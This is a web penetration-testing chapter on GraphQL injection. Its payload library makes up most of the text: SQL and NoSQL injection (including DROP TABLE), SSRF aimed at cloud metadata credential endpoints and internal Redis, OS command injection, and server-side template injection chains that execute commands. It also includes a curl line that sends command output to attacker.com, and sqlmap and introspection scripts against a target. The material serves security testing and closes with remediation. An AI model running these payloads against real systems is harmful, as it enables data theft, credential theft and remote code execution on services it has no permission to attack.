---
title: "GraphQL Injection"
date: 2026-02-24
draft: false
---

# GraphQL Injection

> **Severity**: Critical | **CWE**: CWE-89, CWE-78, CWE-918
> **OWASP**: A03:2021 – Injection

---

## What Is GraphQL Injection?

GraphQL injection is distinct from GraphQL-level abuse (rate limiting, introspection, DoS — covered in Chapter 83). This chapter focuses on **second-order injection through GraphQL resolvers**: the SQL, command, SSTI, NoSQL, or SSRF payloads that flow through GraphQL arguments into backend systems that trust them.

GraphQL arguments bypass many traditional WAF rules because:
1. The payload is inside JSON with a GraphQL-specific syntax
2. Nested fields and aliases obscure the injection point
3. GraphQL variables allow multi-step payload delivery
4. Batch/alias attacks multiply the injection surface

```
GraphQL injection path:
  { users(search: "' OR '1'='1") { id email } }
                     ↓
  Resolver: db.query(`SELECT * FROM users WHERE name = '${args.search}'`)
                     ↓
  SQL injection via resolver argument
```

---

## Discovery Checklist

**Phase 1 — Enumerate Injection Points**
- [ ] Run introspection to map all query/mutation arguments
- [ ] Identify String-type arguments — primary injection candidates
- [ ] Look for arguments named: `search`, `filter`, `where`, `query`, `id`, `url`, `path`, `email`, `name`, `command`
- [ ] Check mutation input objects — complex nested structures multiply attack surface
- [ ] Identify `ID` scalar arguments — may be used in database lookups (IDOR + SQLi)
- [ ] Look for `url`, `endpoint`, `webhook`, `redirect` arguments → SSRF candidates

**Phase 2 — Test Injection**
- [ ] Test SQLi: boolean-based, error-based, time-based blind, union-based
- [ ] Test NoSQL: MongoDB operator injection via string `{"$gt":""}` → JSON injection
- [ ] Test CMDi: OS command injection via shell-calling resolvers
- [ ] Test SSTI: template injection if output includes dynamic rendering
- [ ] Test SSRF: URL-accepting arguments that trigger server-side requests
- [ ] Test path traversal: file-related arguments

**Phase 3 — Amplification via GraphQL Features**
- [ ] Use aliases to multiply injection test across many fields simultaneously
- [ ] Use fragments to reuse injection payloads
- [ ] Use variables for cleaner payload injection without escaping issues
- [ ] Batch via array of operations for parallel injection testing

---

## Payload Library

### Payload 1 — SQL Injection via GraphQL Arguments

```graphql
# Boolean-based blind SQLi:
{
  users(filter: "' OR '1'='1") {
    id
    email
  }
}

# Error-based (MySQL):
{
  users(search: "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -") {
    id
  }
}

# Error-based (PostgreSQL):
{
  users(search: "' AND 1=cast((SELECT version()) as int)-- -") {
    id
  }
}

# UNION-based:
{
  users(search: "' UNION SELECT null,username,password,null FROM admin_users-- -") {
    id
    email
    username  # These field names may need to match schema — test blind first
  }
}

# Time-based blind (MySQL):
{
  users(search: "' AND SLEEP(5)-- -") {
    id
  }
}

# Time-based blind (PostgreSQL):
{
  users(search: "'; SELECT pg_sleep(5)-- -") {
    id
  }
}

# Via GraphQL variables (cleaner — avoids quote escaping in JSON):
query SearchUsers($filter: String!) {
  users(filter: $filter) {
    id
    email
  }
}
# Variables: {"filter": "' OR '1'='1"}
# Variables: {"filter": "' UNION SELECT table_name,null FROM information_schema.tables-- -"}

# IDOR + SQLi via ID field:
{
  user(id: "1 OR 1=1") {
    id
    email
    role
  }
}

# Nested object injection:
mutation {
  createOrder(input: {
    productId: "1"
    couponCode: "' OR discount=100-- -"
    quantity: 1
  }) {
    orderId
    total
  }
}
```

### Payload 2 — NoSQL Injection via GraphQL

```graphql
# MongoDB operator injection via string argument:
# If backend uses: db.users.find({name: args.name})
# Inject: {"$gt": ""} as name value → matches all users

# String-delivered operator injection:
{
  users(name: "{\"$gt\": \"\"}") {
    id
    email
  }
}

# Or if argument accepts JSON:
{
  users(filter: "{\"password\": {\"$gt\": \"\"}}") {
    id
    email
    password  # or passwordHash
  }
}

# $where injection (MongoDB — executes JS):
{
  users(where: "this.role == 'admin'") {
    id
    email
  }
}

{
  users(where: "function() { return true; }") {
    id
    email
  }
}

# Regex injection (MongoDB $regex):
{
  users(search: ".*") {
    id
    email
  }
}

# Via variables — cleaner JSON injection:
query FindUser($filter: JSON) {
  users(filter: $filter) { id email role }
}
# Variables:
# {"filter": {"$where": "this.role === 'admin'"}}
# {"filter": {"password": {"$regex": ".*"}}}
# {"filter": {"role": {"$ne": ""}}}

# Elasticsearch injection (if GraphQL over Elasticsearch):
{
  search(query: "* OR _exists_:passwordHash") {
    hits {
      _source
    }
  }
}

# DSL injection via string:
{
  search(query: "{\"bool\":{\"must\":[{\"match_all\":{}}]}}") {
    hits { _source }
  }
}
```

### Payload 3 — Server-Side Request Forgery via GraphQL

```graphql
# SSRF via URL-accepting arguments:
{
  fetchPreview(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
    content
  }
}

# Cloud metadata SSRF:
mutation {
  importFromUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role") {
    status
    data
  }
}

# SSRF to internal services:
{
  loadResource(url: "http://internal.corp.net:8080/api/admin") {
    response
  }
}

# Gopher protocol for Redis via SSRF:
{
  fetchWebhook(endpoint: "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AKEYS%20%2A%0D%0A") {
    result
  }
}

# DNS rebinding via GraphQL SSRF:
{
  loadFeed(url: "http://YOUR_REBIND_DOMAIN/") {
    content
  }
}

# Blind SSRF detection via OOB:
{
  sendWebhook(url: "http://YOUR.burpcollaborator.net/graphql-ssrf-test") {
    status
  }
}

# File URL for LFI (if not filtered):
{
  readFile(path: "file:///etc/passwd") {
    content
  }
}

# dict:// for Redis:
{
  probeEndpoint(url: "dict://127.0.0.1:6379/KEYS:*") {
    response
  }
}
```

### Payload 4 — Command Injection via GraphQL Resolvers

```graphql
# OS command injection via shell-calling resolvers:
# Common in custom implementations using child_process, subprocess, exec

mutation {
  generateReport(template: "report.pdf; id > /tmp/pwned") {
    url
  }
}

# Ping/traceroute-style commands (common in network tools):
{
  pingHost(host: "127.0.0.1; cat /etc/passwd") {
    result
  }
}

# File conversion with OS command injection:
mutation {
  convertFile(filename: "test.jpg$(id)") {
    downloadUrl
  }
}

# Backtick injection:
mutation {
  sendEmail(to: "user@target.com", subject: "`id`") {
    status
  }
}

# Null byte to truncate filename + injection:
mutation {
  readDocument(name: "report\x00; id") {
    content
  }
}

# Via variables for cleaner encoding:
mutation ConvertImage($input: ConvertInput!) {
  convertImage(input: $input) { url }
}
# Variables:
# {"input": {"source": "image.png", "target": "output.pdf; curl https://attacker.com/$(id)"}}
```

### Payload 5 — SSTI via GraphQL Template Arguments

```graphql
# If resolver renders output through template engine:
{
  renderTemplate(template: "{{7*7}}") {
    output
  }
}
# Response: output: "49" → Jinja2/Twig/Freemarker template injection

# Jinja2/Python SSTI:
{
  renderTemplate(template: "{{''.__class__.__mro__[1].__subclasses__()[273]('id',shell=True,stdout=-1).communicate()[0]}}") {
    output
  }
}

# Freemarker SSTI (Java):
{
  render(template: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}") {
    output
  }
}

# Velocity SSTI (Java):
{
  render(template: "#set($e=''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id'))$e.waitFor()") {
    output
  }
}

# Twig SSTI (PHP):
{
  render(template: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}") {
    output
  }
}

# Handlebars SSTI (JavaScript):
{
  render(template: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id').toString();\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}") {
    output
  }
}
```

### Payload 6 — Batch Injection (Amplified Testing)

```graphql
# Use GraphQL aliases to test multiple injection payloads simultaneously:
{
  test1: users(filter: "' OR '1'='1") { id }
  test2: users(filter: "'; SELECT SLEEP(5)-- -") { id }
  test3: users(filter: "' UNION SELECT null,null-- -") { id }
  test4: users(filter: "'; DROP TABLE users-- -") { id }
  test5: users(filter: "admin'--") { id }
}

# Parallel SSRF via aliases:
{
  meta_aws: fetchUrl(url: "http://169.254.169.254/latest/meta-data/") { content }
  meta_gcp: fetchUrl(url: "http://metadata.google.internal/computeMetadata/v1/") { content }
  meta_azure: fetchUrl(url: "http://169.254.169.254/metadata/instance") { content }
  internal_redis: fetchUrl(url: "http://127.0.0.1:6379/") { content }
  internal_docker: fetchUrl(url: "http://127.0.0.1:2375/info") { content }
}

# Batch mutations — multiple injection attempts in one request:
mutation {
  a: createUser(email: "' OR '1'='1", role: "admin") { id }
  b: createUser(email: "test@test.com", role: "admin'; UPDATE users SET role='admin'-- -") { id }
  c: updateUser(id: "1", data: {email: "admin@target.com"; DROP TABLE users-- -"}) { id }
}

# Using fragments to reuse injection payload:
fragment InjectionTest on User {
  id
  email
}

{
  a: user(id: "1 OR 1=1") { ...InjectionTest }
  b: user(id: "1 UNION SELECT null,null-- -") { ...InjectionTest }
  c: user(id: "'; SELECT password FROM users WHERE username='admin'-- -") { ...InjectionTest }
}
```

---

## Tools

```bash
# Automated GraphQL injection testing with sqlmap:
# Extract schema via introspection → convert to REST-like → sqlmap
python3 << 'EOF'
import requests, json

TARGET = "https://target.com/graphql"
HEADERS = {"Content-Type": "application/json", "Authorization": "Bearer TOKEN"}

# Introspect to find injection points:
introspect = """
{ __schema {
  queryType { fields { name args { name type { name kind ofType { name } } } } }
  mutationType { fields { name args { name type { name kind ofType { name } } } } }
} }
"""
r = requests.post(TARGET, headers=HEADERS, json={"query": introspect})
schema = r.json()

# Find String arguments (potential injection points):
for op_type in ["queryType", "mutationType"]:
    fields = schema.get("data", {}).get("__schema", {}).get(op_type, {}).get("fields", [])
    for field in fields:
        for arg in field.get("args", []):
            type_name = (arg.get("type", {}).get("name") or
                        arg.get("type", {}).get("ofType", {}).get("name", ""))
            if type_name in ("String", "ID"):
                print(f"Injection candidate: {field['name']}({arg['name']}: {type_name})")
EOF

# graphw00f — GraphQL fingerprinting:
git clone https://github.com/nicowillis/graphw00f
python3 graphw00f.py -f -t https://target.com/graphql

# sqlmap via GraphQL JSON:
# Create a request file:
cat > /tmp/graphql_req.txt << 'EOF'
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer TOKEN

{"query":"{ users(search: \"*\") { id email } }"}
EOF

sqlmap -r /tmp/graphql_req.txt --dbms=mysql -p search \
  --data '{"query":"{ users(search: \"*\") { id email } }"}' \
  --level=5 --risk=3

# gqlspection — GraphQL security analysis:
pip3 install gqlspection
gqlspection -u https://target.com/graphql -H "Authorization: Bearer TOKEN"

# InQL (Burp extension) — GraphQL testing:
# BApp Store: InQL
# Automatically runs introspection, generates test templates

# Manual SSRF detection via Burp Collaborator:
curl -s "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query":"{ fetchUrl(url: \"http://COLLABORATOR.burpcollaborator.net/test\") { content } }"}'
```

---

## Remediation Reference

- **Parameterized queries in all resolvers**: never use string concatenation to build database queries; use ORM query builders or prepared statements regardless of whether the caller is REST or GraphQL
- **Input sanitization per resolver**: GraphQL arguments arrive as typed scalars, but apply backend validation: length limits, character whitelists, format validation for IDs/emails
- **SSRF prevention**: resolvers that make HTTP requests must use an allowlist of permitted domains and protocols; block RFC-1918 addresses and metadata IP ranges
- **Principle of least privilege for resolvers**: each resolver should use a database user with minimal permissions — a search resolver needs only SELECT, not INSERT/DELETE
- **Disable introspection in production**: prevents enumeration of injection points (defense in depth — not a fix for injection itself)
- **Query depth and complexity limits**: limit how deeply nested queries can go — prevents constructing complex injection payloads that bypass timeouts
- **Persistent query pattern**: only allow pre-registered query hashes in production — prevents arbitrary query injection

*Part of the Web Application Penetration Testing Methodology series.*
